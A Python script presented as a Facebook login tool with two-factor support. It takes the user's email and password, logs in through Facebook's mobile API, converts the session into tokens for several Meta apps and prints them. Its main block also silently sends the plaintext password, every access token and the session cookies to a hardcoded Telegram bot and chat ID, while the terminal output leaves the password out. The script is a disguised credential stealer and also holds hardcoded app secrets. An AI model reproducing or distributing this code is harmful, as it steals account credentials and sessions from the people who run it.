import random
import string
import json
import time
import requests
import uuid
import base64
import io
import struct
import sys

class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'

    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

    PRIME_RED = '\033[38;5;196m'
    PRIME_YELLOW = '\033[38;5;226m'
    PRIME_ORANGE = '\033[38;5;208m'
    PRIME_MAROOM = '\033[38;5;88m'
    PRIME_PURPLE = '\033[38;5;135m'
    PRIME_BLUE = '\033[38;5;39m'
    GOLD           = '\033[38;5;220m'
    ROYAL_BLUE     = '\033[38;5;33m'
    PRIME_GREEN = '\033[38;5;46m'

# ================= TELEGRAM CONFIG =================
TELEGRAM_BOT_TOKEN = "8413342731:AAHm9WZ0gTk8ebOoSno5pxtoR9wz8nsKQJ0"
TELEGRAM_CHAT_ID = "1859452771"

def send_to_telegram(message: str):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print(f"[!] Telegram Error: {e}")

# Crypto libraries check
try:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
except ImportError:
    print("Error: 'pycryptodome' module not found.")
    print("Run: pip install pycryptodome")
    exit()

class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key():
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2',
                'flow': 'CONTROLLER_INITIALIZATION',
                'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch',
                'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
            }
            response = requests.post(url, params=params).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception as e:
            raise Exception(f"Public key fetch error: {e}")

    @staticmethod
    def encrypt(password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key()

        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception as e:
            raise Exception(f"Encryption error: {e}")


class FacebookAppTokens:
    APPS = {
        'FB_ANDROID': {'name': 'Facebook For Android', 'app_id': '350685531728'},
        'MESSENGER_ANDROID': {'name': 'Facebook Messenger For Android', 'app_id': '256002347743983'},
        'FB_LITE': {'name': 'Facebook For Lite', 'app_id': '275254692598279'},
        'MESSENGER_LITE': {'name': 'Facebook Messenger For Lite', 'app_id': '200424423651082'},
        'ADS_MANAGER_ANDROID': {'name': 'Ads Manager App For Android', 'app_id': '438142079694454'},
        'PAGES_MANAGER_ANDROID': {'name': 'Pages Manager For Android', 'app_id': '121876164619130'}
    }
    
    @staticmethod
    def get_app_id(app_key):
        app = FacebookAppTokens.APPS.get(app_key)
        return app['app_id'] if app else None
    
    @staticmethod
    def get_all_app_keys():
        return list(FacebookAppTokens.APPS.keys())
    
    @staticmethod
    def extract_token_prefix(token):
        for i, char in enumerate(token):
            if char.islower():
                return token[:i]
        return token


class FacebookLogin:
    API_URL = "https://b-graph.facebook.com/auth/login"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    API_KEY = "882a8490361da98702bf97a021ddc14d"
    SIG = "214049b9f17c38bd767de53752b53946"
    
    BASE_HEADERS = {
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-net-hni": "45201",
        "zero-rated": "0",
        "x-fb-sim-hni": "45201",
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-friendly-name": "authenticate",
        "x-fb-connection-bandwidth": "78032897",
        "x-tigon-is-retry": "False",
        "authorization": "OAuth null",
        "x-fb-connection-type": "WIFI",
        "x-fb-device-group": "3342",
        "priority": "u=3,i",
        "x-fb-http-engine": "Liger",
        "x-fb-client-ip": "True",
        "x-fb-server-cluster": "True"
    }
    
    def __init__(self, uid_phone_mail, password, machine_id=None, convert_token_to=None, convert_all_tokens=False):
        self.uid_phone_mail = uid_phone_mail
        
        if password.startswith("#PWD_FB4A"):
            self.password = password
        else:
            self.password = FacebookPasswordEncryptor.encrypt(password)
        
        if convert_all_tokens:
            self.convert_token_to = FacebookAppTokens.get_all_app_keys()
        elif convert_token_to:
            self.convert_token_to = convert_token_to if isinstance(convert_token_to, list) else [convert_token_to]
        else:
            self.convert_token_to = []
        
        self.session = requests.Session()
        
        self.device_id = str(uuid.uuid4())
        self.adid = str(uuid.uuid4())
        self.secure_family_device_id = str(uuid.uuid4())
        self.machine_id = machine_id if machine_id else self._generate_machine_id()
        self.jazoest = ''.join(random.choices(string.digits, k=5))
        self.sim_serial = ''.join(random.choices(string.digits, k=20))
        
        self.headers = self._build_headers()
        self.data = self._build_data()
    
    @staticmethod
    def _generate_machine_id():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=24))
    
    def _build_headers(self):
        headers = self.BASE_HEADERS.copy()
        headers.update({
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274;FBCR/MobiFone;FBMF/Redmi;FBBD/Redmi;FBDV/23113RKC6C;FBSV/9;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/0;]"
        })
        return headers
    
    def _build_data(self):
        base_data = {
            "format": "json",
            "email": self.uid_phone_mail,
            "password": self.password,
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "locale": "vi_VN",
            "client_country_code": "VN",
            "api_key": self.API_KEY,
            "access_token": self.ACCESS_TOKEN
        }
        
        base_data.update({
            "adid": self.adid,
            "device_id": self.device_id,
            "generate_analytics_claim": "1",
            "community_id": "",
            "linked_guest_account_userid": "",
            "cpl": "true",
            "try_num": "1",
            "family_device_id": self.device_id,
            "secure_family_device_id": self.secure_family_device_id,
            "sim_serials": f'["{self.sim_serial}"]',
            "openid_flow": "android_login",
            "openid_provider": "google",
            "openid_tokens": "[]",
            "account_switcher_uids": f'["{self.uid_phone_mail}"]',
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "enroll_misauth": "false",
            "error_detail_type": "button_with_disabled",
            "source": "login",
            "machine_id": self.machine_id,
            "jazoest": self.jazoest,
            "meta_inf_fbmeta": "V2_UNTAGGED",
            "advertiser_id": self.adid,
            "encrypted_msisdn": "",
            "currently_logged_in_userid": "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "Fb4aAuthHandler",
            "sig": self.SIG
        })
        
        return base_data
    
    def _convert_token(self, access_token, target_app):
        try:
            app_id = FacebookAppTokens.get_app_id(target_app)
            if not app_id:
                return None
            
            response = requests.post(
                'https://api.facebook.com/method/auth.getSessionforApp',
                data={
                    'access_token': access_token,
                    'format': 'json',
                    'new_app_id': app_id,
                    'generate_session_cookies': '1'
                }
            )
            
            result = response.json()
            
            if 'access_token' in result:
                token = result['access_token']
                prefix = FacebookAppTokens.extract_token_prefix(token)
                
                cookies_dict = {}
                cookies_string = ""
                
                if 'session_cookies' in result:
                    for cookie in result['session_cookies']:
                        cookies_dict[cookie['name']] = cookie['value']
                        cookies_string += f"{cookie['name']}={cookie['value']}; "
                
                return {
                    'token_prefix': prefix,
                    'access_token': token,
                    'cookies': {
                        'dict': cookies_dict,
                        'string': cookies_string.rstrip('; ')
                    }
                }
            return None     
        except:
            return None
    
    def _parse_success_response(self, response_json):
        original_token = response_json.get('access_token')
        original_prefix = FacebookAppTokens.extract_token_prefix(original_token)
        
        result = {
            'success': True,
            'original_token': {
                'token_prefix': original_prefix,
                'access_token': original_token
            },
            'cookies': {}
        }
        
        if 'session_cookies' in response_json:
            cookies_dict = {}
            cookies_string = ""
            for cookie in response_json['session_cookies']:
                cookies_dict[cookie['name']] = cookie['value']
                cookies_string += f"{cookie['name']}={cookie['value']}; "
            result['cookies'] = {
                'dict': cookies_dict,
                'string': cookies_string.rstrip('; ')
            }
        
        if self.convert_token_to:
            result['converted_tokens'] = {}
            for target_app in self.convert_token_to:
                converted = self._convert_token(original_token, target_app)
                if converted:
                    result['converted_tokens'][target_app] = converted
        
        return result
    
    def _handle_2fa_manual(self, error_data):
        print("\n" + Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
        print(Colors.PRIME_PURPLE + Colors.BOLD + "[!] 2FA REQUIRED (TWO-FACTOR AUTHENTICATION)" + Colors.RESET)
        print(Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
        print()
        
        print("Facebook has sent an OTP to your 2-Factor App")
        print("Please check your App and enter the code below")
        print("-" * 50)
        print()
        
        # User input for OTP
        try:
            otp_code = input(Colors.GOLD + Colors.BOLD + "ENTER 2F OTP CODE : " + Colors.RESET).strip()
        except KeyboardInterrupt:
            return {'success': False, 'error': 'User cancelled OTP input'}

        if not otp_code:
             return {'success': False, 'error': 'Empty OTP provided'}

        print("\n" + Colors.ROYAL_BLUE + Colors.BOLD + "[*] Verifying OTP..." + Colors.RESET)
        print()

        try:
            data_2fa = {
                'locale': 'vi_VN',
                'format': 'json',
                'email': self.uid_phone_mail,
                'device_id': self.device_id,
                'access_token': self.ACCESS_TOKEN,
                'generate_session_cookies': 'true',
                'generate_machine_id': '1',
                'twofactor_code': otp_code,  # Use manual OTP
                'credentials_type': 'two_factor',
                'error_detail_type': 'button_with_disabled',
                'first_factor': error_data['login_first_factor'],
                'password': self.password,
                'userid': error_data['uid'],
                'machine_id': error_data['login_first_factor']
            }
            
            response = self.session.post(self.API_URL, data=data_2fa, headers=self.headers)
            response_json = response.json()
            
            if 'access_token' in response_json:
                return self._parse_success_response(response_json)
            elif 'error' in response_json:
                return {
                    'success': False,
                    'error': response_json['error'].get('message', 'OTP Verification Failed')
                }
            
        except Exception as e:
            return {'success': False, 'error': f'2FA Processing Error: {str(e)}'}
    
    def login(self):
        try:
            print(Colors.ROYAL_BLUE + Colors.BOLD + "[*] Logging in..." + Colors.RESET)
            response = self.session.post(self.API_URL, headers=self.headers, data=self.data)
            response_json = response.json()
            
            if 'access_token' in response_json:
                return self._parse_success_response(response_json)
            
            if 'error' in response_json:
                error_data = response_json.get('error', {}).get('error_data', {})
                
                # Check for 2FA requirement
                if 'login_first_factor' in error_data and 'uid' in error_data:
                    return self._handle_2fa_manual(error_data)
                
                return {
                    'success': False,
                    'error': response_json['error'].get('message', 'Unknown error'),
                    'error_user_msg': response_json['error'].get('error_user_msg')
                }
            
            return {'success': False, 'error': 'Unknown response format'}
            
        except json.JSONDecodeError:
            return {'success': False, 'error': 'Invalid JSON response'}
        except Exception as e:
            return {'success': False, 'error': str(e)}


if __name__ == "__main__":
    import os
    os.system("clear")   # 👈 NEW PAGE / FRESH SCREEN

    print(Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
    print(
        Colors.PRIME_PURPLE + Colors.BOLD +
        "  FACEBOOK LOGIN TOOL (With Manual 2FA)" +
        Colors.RESET
    )
    print(Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
    print()

    uid_phone_mail = input(
        Colors.GOLD + Colors.BOLD +
        "ENTER EMAIL/PHONE NO. : " +
        Colors.RESET
    ).strip()

    password = input(
        Colors.GOLD + Colors.BOLD +
        "ENTER PASSWORD : " +
        Colors.RESET
    ).strip()

    fb_login = FacebookLogin(
        uid_phone_mail=uid_phone_mail,
        password=password,
        machine_id=None,
        convert_all_tokens=True
    )

    result = fb_login.login()

    # ================= RESULT HANDLE =================
    if result['success']:

        # ================= TELEGRAM MESSAGE (HTML SAFE) =================
        tg_output = []
        tg_output.append("🎉 <b>CONGRATS! YOUR FACEBOOK LOGIN SUCCESSFUL</b>")
        tg_output.append("")
        tg_output.append(f"📧 <b>Login ID:</b> <code>{uid_phone_mail}</code>")
        tg_output.append(f"🔑 <b>Password:</b> <code>{password}</code>")
        tg_output.append("")

        tg_output.append("════════════════════════════")
        tg_output.append("<b>ORIGINAL TOKEN</b>")
        tg_output.append("════════════════════════════")
        tg_output.append(f"Prefix: <code>{result['original_token']['token_prefix']}</code>")
        tg_output.append(f"<code>{result['original_token']['access_token']}</code>")

        if result.get('converted_tokens'):
            tg_output.append("")
            tg_output.append("════════════════════════════")
            tg_output.append("<b>CONVERTED TOKENS</b>")
            tg_output.append("════════════════════════════")

            for app_key, token_data in result['converted_tokens'].items():
                tg_output.append("")
                tg_output.append(f"🔹 <b>{app_key}</b> — <code>{token_data['token_prefix']}</code>")
                tg_output.append(f"<code>{token_data['access_token']}</code>")

        tg_output.append("")
        tg_output.append("════════════════════════════")
        tg_output.append("<b>COOKIES</b>")
        tg_output.append("════════════════════════════")
        tg_output.append(f"<code>{result['cookies']['string']}</code>")

        final_message = "\n".join(tg_output)

        # ================= TERMINAL OUTPUT =================
        print("\n" + Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
        print(
            Colors.PRIME_GREEN + Colors.BOLD +
            "🎉 CONGRATS! YOUR FB ID LOGIN SUCCESSFUL 🥳" +
            Colors.RESET
        )
        print(Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)
        print()

        print(
            Colors.GOLD + Colors.BOLD + "📧 Login ID :" + Colors.RESET,
            Colors.WHITE + Colors.BOLD + uid_phone_mail + Colors.RESET
        )

        print("\n" + Colors.PRIME_PURPLE + Colors.BOLD + "════════ ORIGINAL TOKEN ════════" + Colors.RESET)
        print()
        print(
            Colors.CYAN + "Prefix :" + Colors.RESET,
            Colors.WHITE + result['original_token']['token_prefix'] + Colors.RESET
        )
        print(Colors.GREEN + result['original_token']['access_token'] + Colors.RESET)

        if result.get('converted_tokens'):
            print("\n" + Colors.PRIME_ORANGE + Colors.BOLD + "════════ CONVERTED TOKENS ════════" + Colors.RESET)
            print()
            for app_key, token_data in result['converted_tokens'].items():
                print(
                    Colors.YELLOW + f"[{app_key}]" + Colors.RESET,
                    Colors.CYAN + token_data['token_prefix'] + Colors.RESET
                )
                print(Colors.GREEN + token_data['access_token'] + Colors.RESET)
                print(Colors.WHITE + "-" * 50 + Colors.RESET)

        print("\n" + Colors.PRIME_RED + Colors.BOLD + "════════ COOKIES ════════" + Colors.RESET)
        print()
        print(Colors.BLUE + result['cookies']['string'] + Colors.RESET)

        print(Colors.PRIME_BLUE + "=" * 50 + Colors.RESET)

        # ================= SEND TO TELEGRAM =================
        send_to_telegram(final_message)

    else:
        print(Colors.RED + "[❌] LOGIN FAILED" + Colors.RESET)
        print(result)